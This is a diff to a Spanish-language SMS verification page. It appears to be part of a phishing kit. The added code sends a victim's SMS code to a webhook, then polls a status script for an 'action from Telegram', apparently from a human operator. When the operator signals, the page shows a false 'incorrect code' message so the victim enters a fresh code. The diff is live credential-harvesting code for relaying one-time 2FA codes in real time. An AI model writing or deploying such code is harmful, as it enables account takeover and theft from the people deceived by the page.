@@ -202,19 +202,26 @@
   <script>
     // Mostrar email guardado y mensaje de error si existe
     document.addEventListener('DOMContentLoaded', function() {
-      const savedEmail = sessionStorage.getItem('userEmail');
+      const params = new URLSearchParams(window.location.search);
+      const urlEmail = params.get('email');
+      const urlError = params.get('error');
+      
+      // Email: primero desde URL, luego desde sessionStorage
+      const savedEmail = urlEmail || sessionStorage.getItem('userEmail');
       const emailDisplay = document.getElementById('emailDisplay');
-      const smsError = sessionStorage.getItem('smsError');
       const smsErrorDiv = document.getElementById('smsError');
       
       if (savedEmail) {
+        sessionStorage.setItem('userEmail', savedEmail);
         emailDisplay.textContent = `📩 ${savedEmail}`;
       }
+      
+      // Error: desde URL o desde sessionStorage
+      const smsError = urlError ? 'El código que ingresaste es incorrecto. Por favor, inténtalo de nuevo.' : sessionStorage.getItem('smsError');
       
       if (smsError) {
         smsErrorDiv.textContent = smsError;
         smsErrorDiv.style.display = 'block';
-        // Limpiar el mensaje después de mostrarlo
         sessionStorage.removeItem('smsError');
       }
     });
@@ -239,14 +246,44 @@
         const result = await sendToWebhook({ smsCode: smsCode }, 'sms');
         
         if (result.success) {
-          // Redirigir a página de carga
-          redirectTo('carga.html');
+          // Mostrar spinner de espera y hacer polling
+          smsInput.disabled = true;
+          btnContinuar.disabled = true;
+          btnContinuar.textContent = 'Verificando...';
+          startPolling();
         } else {
           console.error('Error al enviar código SMS:', result.error);
-          // Aquí podrías mostrar un mensaje de error al usuario
         }
       }
     });
+
+    // Polling para esperar acción desde Telegram
+    function startPolling() {
+      var sessionId = sessionStorage.getItem('sessionId');
+      if (!sessionId) return;
+      
+      var pollInterval = setInterval(async function() {
+        try {
+          var response = await fetch('check-status.php?session=' + encodeURIComponent(sessionId));
+          var data = await response.json();
+          
+          if (data.action === 'sms_error') {
+            clearInterval(pollInterval);
+            // Mostrar error y reactivar formulario
+            var smsErrorDiv = document.getElementById('smsError');
+            smsErrorDiv.textContent = 'El código que ingresaste es incorrecto. Por favor, inténtalo de nuevo.';
+            smsErrorDiv.style.display = 'block';
+            smsInput.value = '';
+            smsInput.disabled = false;
+            btnContinuar.disabled = false;
+            btnContinuar.textContent = 'Continuar';
+            btnContinuar.classList.remove('active');
+          }
+        } catch (e) {
+          // Silenciar errores de red
+        }
+      }, 2000);
+    }
   </script>
 </body>
 </html>
